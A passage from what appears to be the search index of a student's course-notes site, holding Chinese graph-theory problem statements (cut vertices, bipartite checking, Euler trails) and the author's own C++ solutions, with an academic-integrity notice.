\u6761\u8fb9\u7684\u65e0\u5411\u56fe\uff0c\u6c42\u56fe\u7684\u5272\u70b9\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#input","title":"Input","text":"<p>\u7b2c\u4e00\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(n,m\\)\u3002</p> <p>\u4e0b\u9762 \\(m\\) \u884c\u6bcf\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(x,y\\) \u8868\u793a \\(x\\) \u5230 \\(y\\) \u6709\u4e00\u6761\u8fb9\u3002</p> <p>\u5bf9\u4e8e \\(40\\%\\) \u6570\u636e\uff0c\\(1\\le n\\le 2\\times 10^3\\)\uff0c\\(1\\le m\\le 5\\times 10^3\\)\u3002</p> <p>\u5bf9\u4e8e\u5168\u90e8\u6570\u636e\uff0c\\(1\\le n\\le 2\\times 10^5\\)\uff0c\\(1\\le m\\le 5\\times 10^5\\)\uff0c\u9876\u70b9\u7f16\u53f7\u90fd\u662f \\(1\u223cn\\) \u7684\u6574\u6570\u3002</p> <p>\u56fe\u4e0d\u4e00\u5b9a\u8054\u901a\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#output","title":"Output","text":"<p>\u7b2c\u4e00\u884c\u8f93\u51fa\u5272\u70b9\u4e2a\u6570\u3002</p> <p>\u7b2c\u4e8c\u884c\u6309\u7167\u8282\u70b9\u7f16\u53f7\u4ece\u5c0f\u5230\u5927\u8f93\u51fa\u8282\u70b9\uff0c\u7528\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#sample-input-1","title":"Sample Input 1","text":"<pre><code>6 7\n1 2\n1 3\n1 4\n2 5\n3 5\n4 5\n5 6\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10003/#sample-output-1","title":"Sample Output 1","text":"<pre><code>1 \n5\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/","title":"P10004","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#p1004","title":"P1004 \u8ddd\u79bb\u4e0e\u5b50\u56fe","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#description","title":"Description","text":"<p>\u7ed9\u51fa\u4e00\u4e2a \\(n\\) \u4e2a\u70b9\uff0c\\(m\\) \u6761\u8fb9\u7684\u65e0\u5411\u7b80\u5355\u8fde\u901a\u56fe\uff0c\u4f60\u9700\u8981\u56de\u7b54\u4ee5\u4e0b\u4e24\u79cd\u8be2\u95ee\u3002</p> <ol> <li>\u7ed9\u51fa\u9876\u70b9 \\(u,v\\)\uff0c\u67e5\u8be2 \\(u,v\\) \u7684\u8ddd\u79bb\uff08\u5b83\u4eec\u6700\u77ed\u8def\u7684\u8fb9\u6570\uff09\u3002</li> <li>\u7ed9\u51fa\u9876\u70b9 \\(a,b,c\\)\uff0c\u4f60\u9700\u8981\u627e\u5230\u539f\u56fe\u7684\u4e00\u4e2a\u8fb9\u6570\u6700\u5c11\u7684\u5b50\u56fe\uff0c\u6ee1\u8db3\u5b50\u56fe\u4e2d \\(a,b\\) \u7684\u8ddd\u79bb\u3001 \\(b,c\\) \u7684\u8ddd\u79bb\u548c \\(a,c\\) \u7684\u8ddd\u79bb\u76f8\u8f83\u4e8e\u539f\u56fe\u4e0d\u53d1\u751f\u6539\u53d8\u3002</li> </ol>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#input","title":"Input","text":"<p>\u7b2c\u4e00\u884c\u8f93\u5165\u4e09\u4e2a\u6b63\u6574\u6570 \\(n,m,q\\)\u3002</p> <p>\u63a5\u4e0b\u6765 \\(m\\) \u884c\u6bcf\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(x,y\\) \u8868\u793a \\(x\\) \u5230 \\(y\\) \u6709\u4e00\u6761\u8fb9\u3002</p> <p>\u63a5\u4e0b\u6765 \\(q\\) \u884c\uff0c\u6bcf\u884c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6574\u6570 \\(op\\) \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\uff0c\u82e5\uff1a</p> <ul> <li>\\(op=1\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(u,v\\)\uff0c\u8868\u793a\u67e5\u8be2\u8fd9\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> <li>\\(op=2\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e09\u4e2a\u6b63\u6574\u6570 \\(a,b,c\\)\uff0c\u8868\u793a\u67e5\u8be2\u4e0a\u8ff0\u9898\u610f\u4e2d\u8fb9\u6570\u6700\u5c0f\u7684\u5b50\u56fe\u8fb9\u6570\u5927\u5c0f\u3002</li> </ul> <p>\u672c\u9898\u5171\u6709 \\(13\\) \u4e2a\u6d4b\u8bd5\u70b9\uff0c\u524d \\(8\\) \u6d4b\u8bd5\u70b9\u6bcf\u4e2a\u6d4b\u8bd5\u70b9 \\(10\\) \u5206\uff0c\u540e \\(5\\) \u4e2a\u6d4b\u8bd5\u70b9\u7ed1\u5b9a\u6d4b\u8bd5\uff0c\u5168\u90e8\u901a\u8fc7\u53ef\u4ee5\u83b7\u5f97 \\(20\\) \u5206\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(1\\)\uff0c\u6ee1\u8db3 \\(q=1\\)\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(1,2,3,4,5\\)\uff0c\u6ee1\u8db3 \\(op=1\\)\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9 \\(6,7,8\\)\uff0c\u6ee1\u8db3 \\(n\\le 400\\).</p> <p>\u5bf9\u4e8e\u5168\u90e8\u6d4b\u8bd5\u70b9\uff0c\u4fdd\u8bc1 \\(n\\le 5000,m\\le 5000,q\\le 5000,1\\le u,v,a,b,c\\le n,op\\in\\{1,2\\}\\)\uff0c\u4fdd\u8bc1 \\(op=2\\) \u7684\u8be2\u95ee\u4e0d\u8d85\u8fc7 \\(5\\) \u6b21\u3002</p> <p>\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u4e2a\u8be2\u95ee\uff0c\u8f93\u51fa\u5355\u72ec\u4e00\u884c\u8868\u793a\u7ed3\u679c\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#sample-input-1","title":"Sample Input 1","text":"<pre><code>16 18 8\n1 2\n1 3\n1 8\n2 11\n2 4\n3 5\n3 6\n4 5\n4 15\n5 10\n6 7\n6 9\n6 14\n8 9\n10 15\n10 16\n11 12\n11 13\n1 1 6\n1 7 15\n1 12 14\n1 4 8\n2 1 2 3\n2 9 11 16\n2 6 12 13\n2 7 8 15\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10004/#sample-output-1","title":"Sample Output 1","text":"<pre><code>2\n5\n6\n3\n2\n11\n6\n10\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/","title":"P10005","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#p1005","title":"P1005 \u8ddd\u79bb\u4e0e\u5b50\u56fe\u3010\u6570\u636e\u52a0\u5f3a\u7248\u3011","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#note","title":"Note","text":"<p>\u6b22\u8fce\u540c\u5b66\u4eec\u8e0a\u8dc3\u6dfb\u52a0 hack \u6570\u636e\uff0c\u672c\u9898\u6b63\u786e\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5e94\u4e3a \\(O(nm)\\).</p> <p>\u7406\u8bba\u4e0a\u672c\u9898\u6682\u65f6\u672a\u80fd\u5361\u6389\u5168\u90e8\u4e0d\u6b63\u786e\u7684\u505a\u6cd5\u3002</p> <p>\u4e5f\u6b22\u8fce\u540c\u5b66\u4eec\u6d4b\u8bd5\u81ea\u5df1\u901a\u8fc7\u666e\u901a\u7248\u9898\u76ee\u7684\u4ee3\u7801\u662f\u5426\u6b63\u786e\u3002</p> <p>\u666e\u901a\u7248\u9898\u76ee\u4e0d\u4f1a\u518d\u8fdb\u884c\u589e\u5f3a\u6570\u636e\u4e0e\u91cd\u6d4b\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#description","title":"Description","text":"<p>\u7ed9\u51fa\u4e00\u4e2a \\(n\\) \u4e2a\u70b9\uff0c\\(m\\) \u6761\u8fb9\u7684\u65e0\u5411\u7b80\u5355\u8fde\u901a\u56fe\uff0c\u4f60\u9700\u8981\u56de\u7b54\u4ee5\u4e0b\u4e24\u79cd\u8be2\u95ee\u3002</p> <ol> <li>\u7ed9\u51fa\u9876\u70b9 \\(u,v\\)\uff0c\u67e5\u8be2 \\(u,v\\) \u7684\u8ddd\u79bb\uff08\u5b83\u4eec\u6700\u77ed\u8def\u7684\u8fb9\u6570\uff09\u3002</li> <li>\u7ed9\u51fa\u9876\u70b9 \\(a,b,c\\)\uff0c\u4f60\u9700\u8981\u627e\u5230\u539f\u56fe\u7684\u4e00\u4e2a\u8fb9\u6570\u6700\u5c11\u7684\u5b50\u56fe\uff0c\u6ee1\u8db3\u5b50\u56fe\u4e2d \\(a,b\\) \u7684\u8ddd\u79bb\u3001 \\(b,c\\) \u7684\u8ddd\u79bb\u548c \\(a,c\\) \u7684\u8ddd\u79bb\u76f8\u8f83\u4e8e\u539f\u56fe\u4e0d\u53d1\u751f\u6539\u53d8\u3002</li> </ol>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#input","title":"Input","text":"<p>\u7b2c\u4e00\u884c\u8f93\u5165\u4e09\u4e2a\u6b63\u6574\u6570 \\(n,m,q\\)\u3002</p> <p>\u63a5\u4e0b\u6765 \\(m\\) \u884c\u6bcf\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(x,y\\) \u8868\u793a \\(x\\) \u5230 \\(y\\) \u6709\u4e00\u6761\u8fb9\u3002</p> <p>\u63a5\u4e0b\u6765 \\(q\\) \u884c\uff0c\u6bcf\u884c\u6bcf\u884c\u7b2c\u4e00\u4e2a\u6574\u6570 \\(op\\) \u8868\u793a\u64cd\u4f5c\u7c7b\u578b\uff0c\u82e5\uff1a</p> <ul> <li>\\(op=1\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(u,v\\)\uff0c\u8868\u793a\u67e5\u8be2\u8fd9\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</li> <li>\\(op=2\\)\uff0c\u63a5\u4e0b\u6765\u8f93\u5165\u4e09\u4e2a\u6b63\u6574\u6570 \\(a,b,c\\)\uff0c\u8868\u793a\u67e5\u8be2\u4e0a\u8ff0\u9898\u610f\u4e2d\u8fb9\u6570\u6700\u5c0f\u7684\u5b50\u56fe\u8fb9\u6570\u5927\u5c0f\u3002</li> </ul> <p>\u5bf9\u4e8e\u5168\u90e8\u6d4b\u8bd5\u70b9\uff0c\u4fdd\u8bc1 \\(n\\le 5000,m\\le 5000,q\\le 5000,1\\le u,v,a,b,c\\le n,op\\in\\{1,2\\}\\)\uff0c\u4fdd\u8bc1 \\(op=2\\) \u7684\u8be2\u95ee\u4e0d\u8d85\u8fc7 \\(5\\) \u6b21\u3002</p> <p>\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u4e2a\u8be2\u95ee\uff0c\u8f93\u51fa\u5355\u72ec\u4e00\u884c\u8868\u793a\u7ed3\u679c\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#sample-input-1","title":"Sample Input 1","text":"<pre><code>16 18 8\n1 2\n1 3\n1 8\n2 11\n2 4\n3 5\n3 6\n4 5\n4 15\n5 10\n6 7\n6 9\n6 14\n8 9\n10 15\n10 16\n11 12\n11 13\n1 1 6\n1 7 15\n1 12 14\n1 4 8\n2 1 2 3\n2 9 11 16\n2 6 12 13\n2 7 8 15\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10005/#sample-output-1","title":"Sample Output 1","text":"<pre><code>2\n5\n6\n3\n2\n11\n6\n10\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/","title":"P10006","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#p1006","title":"P1006 \u4e8c\u5206\u56fe\u5224\u5b9a","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#description","title":"Description","text":"<p>\u7ed9\u51fa\u4e00\u4e2a \\(n\\) \u4e2a\u70b9\uff0c\\(m\\) \u6761\u8fb9\u7684\u65e0\u5411\u56fe\uff0c\u4f60\u9700\u8981\u5224\u65ad\u5b83\u662f\u5426\u662f\u4e00\u4e2a\u4e8c\u5206\u56fe\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#input","title":"Input","text":"<p>\u672c\u9898\u6709\u5171\u6709 \\(T\\) \u7ec4\u6570\u636e\uff0c\u7b2c\u4e00\u884c\u8f93\u5165\u6574\u6570 \\(T\\)\uff0c\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u5165\u683c\u5f0f\u4e3a\uff1a</p> <p>\u7b2c\u4e00\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(n,m\\)\u3002</p> <p>\u63a5\u4e0b\u6765 \\(m\\) \u884c\u6bcf\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(x,y\\) \u8868\u793a \\(x\\) \u5230 \\(y\\) \u6709\u4e00\u6761\u8fb9\u3002</p> <p>\u672c\u9898\u5171\u6709 \\(3\\) \u4e2a\u6d4b\u8bd5\u70b9\u5305\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9\u5305 \\(1\\)\uff0c\u6ee1\u8db3 \\(n\\le 10,m\\le 20,T\\le 10\\)\uff0c\u5171 \\(20\\) \u5206\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9\u5305 \\(2\\)\uff0c\u6ee1\u8db3 \\(n\\le 1000,m\\le 2000,T\\le 10\\)\uff0c\u5171 \\(30\\) \u5206\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9\u5305 \\(3\\)\uff0c\u4fdd\u8bc1 \\(1\\le n\\le 4\\times 10^5,1\\le m\\le 8\\times 10^5,1\\le \\sum n\\le 10^6,1\\le \\sum m\\le 2\\times 10^6\\)\uff0c\u5171 \\(50\\) \u5206\u3002\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u51fa\u5355\u72ec\u4e00\u884c\u8868\u793a\u7ed3\u679c\uff0c\u5982\u679c\u662f\u4e8c\u5206\u56fe\uff0c\u8f93\u5165 \"Y\"\uff0c\u5426\u5219\u8f93\u51fa \"N\"\uff0c\u4e0d\u5e26\u5f15\u53f7\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#sample-input-1","title":"Sample Input 1","text":"<pre><code>3\n5 5\n1 2\n1 3\n1 4\n1 5\n2 3\n6 7\n1 4\n2 5\n3 6\n1 4\n1 5\n3 4\n4 3\n1 2\n1 1\n1 1\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10006/#sample-output-1","title":"Sample Output 1","text":"<pre><code>N\nY\nN\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/","title":"P10007","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#p1007","title":"P1007 \u6b27\u62c9\u8ff9","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#description","title":"Description","text":"<p>\u7ed9\u51fa\u4e00\u4e2a \\(n\\) \u4e2a\u70b9\uff0c\\(m\\) \u6761\u8fb9\u7684\u65e0\u5411\u56fe\uff0c\u4f60\u9700\u8981\u5224\u65ad\u5b83\u662f\u5426\u542b\u6709\u6b27\u62c9\u8ff9\uff0c\u82e5\u542b\u6709\uff0c\u5219\u8f93\u51fa\u4e00\u6761\u6b27\u62c9\u8ff9\u3002</p> <p>\u6ce8\u610f\uff1a\u6b27\u62c9\u8ff9\u4ec5\u8981\u6c42\u6240\u6709\u8fb9\u904d\u5386\u4e00\u6b21\uff0c\u5141\u8bb8\u5b64\u70b9\u4e0d\u88ab\u904d\u5386\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#format","title":"Format","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#input","title":"Input","text":"<p>\u672c\u9898\u6709\u5171\u6709 \\(T\\) \u7ec4\u6570\u636e\uff0c\u7b2c\u4e00\u884c\u8f93\u5165\u6574\u6570 \\(T\\)\uff0c\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u5165\u683c\u5f0f\u4e3a\uff1a</p> <p>\u7b2c\u4e00\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(n,m\\)\u3002</p> <p>\u63a5\u4e0b\u6765 \\(m\\) \u884c\u6bcf\u884c\u8f93\u5165\u4e24\u4e2a\u6b63\u6574\u6570 \\(x,y\\) \u8868\u793a \\(x\\) \u5230 \\(y\\) \u6709\u4e00\u6761\u65e0\u5411\u8fb9\u3002</p> <p>\u672c\u9898\u5171\u6709 \\(3\\) \u4e2a\u6d4b\u8bd5\u70b9\u5305\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9\u5305 \\(1\\)\uff0c\u6ee1\u8db3 \\(n\\le 10,m\\le 20,T\\le 10\\)\u3002</p> <p>\u5bf9\u4e8e\u6d4b\u8bd5\u70b9\u5305 \\(2\\)\uff0c\u6ee1\u8db3 \\(n\\le 1000,m\\le 2000,T\\le 10\\)\u3002</p> <p>\u5bf9\u4e8e\u5168\u90e8\u6d4b\u8bd5\u70b9\uff0c\u4fdd\u8bc1 \\(n\\le 5\\times 10^5,m\\le 2\\times n,1\\le \\sum n\\le 10^6,1\\le \\sum m\\le 2\\times 10^6\\).</p> <p>\u4fdd\u8bc1\u6240\u6709\u64cd\u4f5c\u6ee1\u8db3\u9898\u76ee\u63cf\u8ff0\uff0c\u4fdd\u8bc1\u6bcf\u4e00\u884c\u7684\u4e24\u4e2a\u76f8\u90bb\u6574\u6570\u90fd\u4ec5\u7528\u4e00\u4e2a\u7a7a\u683c\u9694\u5f00\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#output","title":"Output","text":"<p>\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u5982\u679c\u4e0d\u542b\u6b27\u62c9\u8ff9\uff0c\u8f93\u51fa\u4e00\u884c \"No\"\u3002\u5426\u5219\u7b2c\u4e00\u884c\u8f93\u51fa \"Yes\"\uff0c\u7b2c\u4e8c\u884c\u8f93\u51fa \\(l\\) \u8868\u793a\u6b27\u62c9\u8ff9\u4e0a\u7684\u9876\u70b9\u4e2a\u6570\uff0c\u7b2c\u4e09\u884c\u8f93\u51fa \\(l\\) \u4e2a\u6574\u6570\uff0c\u8868\u793a\u6b27\u62c9\u8ff9\u4e0a\u7684\u9876\u70b9\uff0c\u4f60\u9700\u8981\u4fdd\u8bc1\u76f8\u90bb\u7684\u9876\u70b9\u95f4\u5b58\u5728\u8fde\u8fb9\uff0c\u4e14\u6bcf\u6761\u8fb9\u51fa\u73b0\u4e14\u4ec5\u51fa\u73b0\u4e00\u6b21\u3002\u82e5\u5e72\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8f93\u51fa\u4efb\u610f\u4e00\u4e2a\u5373\u53ef\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#samples","title":"Samples","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#sample-input-1","title":"Sample Input 1","text":"<pre><code>4\n5 6\n1 2\n2 3\n3 4\n4 5\n5 1\n3 5\n5 9\n1 2 \n2 1\n2 3\n3 5\n2 5\n2 5\n2 4\n1 4\n1 5\n4 3\n1 2\n1 3\n1 4\n3 2\n1 2\n2 1\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges/P10007/#sample-output-1","title":"Sample Output 1","text":"<pre><code>Yes\n7\n3 5 1 2 3 4 5 \nYes\n10\n1 5 2 4 1 2 5 3 2 1 \nNo\nYes\n3\n1 2 1 \n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/AAA_README/","title":"AAA README","text":"<p>\u6b64\u5904\u6240\u6709\u7684\u4ee3\u7801\u5747\u4e3a\u672c\u4eba\u4e00\u5b57\u4e00\u53e5\u5199\u51fa\uff0c\u5e76\u6ca1\u6709\u4f7f\u7528 AI.</p> <p>\u5982\u679c\u4f60\u60f3\u8981\u53c2\u8003\u6b64\u5904\u7684\u4ee3\u7801\uff0c\u8bf7\u786e\u8ba4\u4f60\u7684\u884c\u4e3a\u662f\u5426\u6b63\u5f53\uff0c\u7279\u522b\u662f\u662f\u5426\u8fdd\u53cd\u4e86\u5b66\u672f\u8bda\u4fe1\u539f\u5219\u3002</p> <p>\u5bf9\u4e8e\u4e0d\u6b63\u5f53\u53c2\u8003\u7684\u884c\u4e3a\uff0c\u8bf7\u4e09\u601d\uff0c\u5176\u540e\u679c\u81ea\u8d1f\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1001/","title":"P1001","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef std::pair&lt;int, int&gt; PII;\nconst int N = 100010;\nint q, inpo, inpx, inpu, inpv, inps;\nstd::set&lt;int&gt; pts;\nint ptsize;\nstd::vector&lt;PII&gt; eds;\nstd::vector&lt;int&gt; query;\nbool tag[N];\nstd::vector&lt;int&gt; adj[N];\nint deg[N];\n\nint main(void) {\n    scanf(\"%d\", &amp;q);\n    while (q --) {\n        scanf(\"%d\", &amp;inpo);\n        if (inpo == 1) {\n            scanf(\"%d\", &amp;inpx);\n            if (pts.find(inpx) == pts.end()) {\n                ++ ptsize;\n                pts.insert(inpx);\n            }\n            printf(\"%d\\n\", ptsize);\n        } else if (inpo == 2) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            if (pts.find(inpu) == pts.end() || pts.find(inpv) == pts.end()) {\n                continue;\n            }\n            adj[inpu].push_back(inpv);\n            adj[inpv].push_back(inpu);\n            ++ deg[inpu];\n            ++ deg[inpv];\n            eds.push_back(std::make_pair(inpu, inpv));\n        } else if (inpo == 3) {\n            scanf(\"%d\", &amp;inpx);\n            printf(\"%d\\n\", deg[inpx]);\n        } else if (inpo == 4) {\n            scanf(\"%d\", &amp;inps);\n            query.resize(inps);\n            for (int i = 0; i &lt; inps; ++ i) {\n                scanf(\"%d\", &amp;query[i]);\n                tag[query[i]] = true;\n            }\n            int ans = 0;\n            for (int i = 0; i &lt; inps; ++ i) {\n                for (int j = 0, l = adj[query[i]].size(); j &lt; l; ++ j) {\n                    if (tag[adj[query[i]][j]]) {\n                        ++ ans;\n                    }\n                }\n            }\n            ans &gt;&gt;= 1;\n            printf(\"%d\\n\", ans);\n            for (int i = 0; i &lt; inps; ++ i) {\n                tag[query[i]] = false;\n            }\n        } else if (inpo == 5) {\n            int ans = 0;\n            scanf(\"%d\", &amp;inps);\n            for (int i = 0; i &lt; inps; ++ i) {\n                scanf(\"%d\", &amp;inpx);\n                -- inpx;\n                if (!tag[eds[inpx].first]) {\n                    ++ ans;\n                    tag[eds[inpx].first] = true;\n                }\n                if (!tag[eds[inpx].second]) {\n                    ++ ans;\n                    tag[eds[inpx].second] = true;\n                }\n            }\n            printf(\"%d\\n\", ans);\n            for (auto it = pts.begin(); it != pts.end(); ++ it) {\n                tag[*it] = false;\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1002/","title":"P1002","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\nconst int N = 200010;\nint q, n;\nbool state[2];\nstruct Graph {\n    std::set&lt;int&gt; adj[N];\n    int edsize;\n\n    bool testedge(int u, int v) {\n        return adj[u].find(v) != adj[u].end();\n    }\n    void addedge(int u, int v) {\n        adj[u].insert(v);\n        adj[v].insert(u);\n        ++ edsize;\n        return;\n    }\n    void remedge(int u, int v) {\n        adj[u].erase(adj[u].find(v));\n        adj[v].erase(adj[v].find(u));\n        -- edsize;\n        return;\n    }\n    void flipedge(int u, int v) {\n        if (testedge(u, v)) {\n            remedge(u, v);\n        } else {\n            addedge(u, v);\n        }\n        return;\n    }\n};\nGraph g[2];\nGraph sub12, inter, sub21;\n\nint main(void) {\n    int inpo, inpg, inps, inpu, inpv;\n    bool have[2];\n\n    scanf(\"%d%d\", &amp;n, &amp;q);\n    i64 all = (1ll * n * (n - 1)) &gt;&gt; 1;\n    while (q --) {\n        scanf(\"%d\", &amp;inpo);\n        if (inpo == 1) {\n            scanf(\"%d%d\", &amp;inpg, &amp;inps);\n            -- inpg;\n            for (int i = 0; i &lt; inps; ++ i) {\n                scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n                have[0] = g[0].testedge(inpu, inpv);\n                have[1] = g[1].testedge(inpu, inpv);\n                g[inpg].flipedge(inpu, inpv);\n                if (inpg == 0) {\n                    if (!have[1]) {\n                        sub12.flipedge(inpu, inpv);\n                    } else {\n                        sub21.flipedge(inpu, inpv);\n                        inter.flipedge(inpu, inpv);\n                    }\n                } else {\n                    if (!have[0]) {\n                        sub21.flipedge(inpu, inpv);\n                    } else {\n                        sub12.flipedge(inpu, inpv);\n                        inter.flipedge(inpu, inpv);\n                    }\n                }\n            }\n        } else if (inpo == 2) {\n            scanf(\"%d\", &amp;inpg);\n            state[inpg - 1] xor_eq true;\n        } else if (inpo == 3) {\n            i64 ans0 = (state[0]) ? (all - g[0].edsize) : g[0].edsize;\n            i64 ans1 = (state[1]) ? (all - g[1].edsize) : g[1].edsize;\n            printf(\"%lld %lld\\n\", ans0, ans1);\n        } else if (inpo == 4) {\n            i64 A = sub12.edsize, B = inter.edsize, C = sub21.edsize;\n            i64 D = all - A - B - C;\n            if (!state[0]) {\n                if (!state[1]) {\n                    printf(\"%lld %lld\\n\", B, A + B + C);\n                } else {\n                    printf(\"%lld %lld\\n\", A, A + B + D);\n                }\n            } else {\n                if (!state[1]) {\n                    printf(\"%lld %lld\\n\", C, B + C + D);\n                } else {\n                    printf(\"%lld %lld\\n\", D, A + C + D);\n                }\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1003/","title":"P1003","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 200010, M = 500010;\nint n, m;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx = 0;\nint fa[N], sons[N], dfn[N], low[N], tsp;\nbool iscut[N];\nint ans;\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] 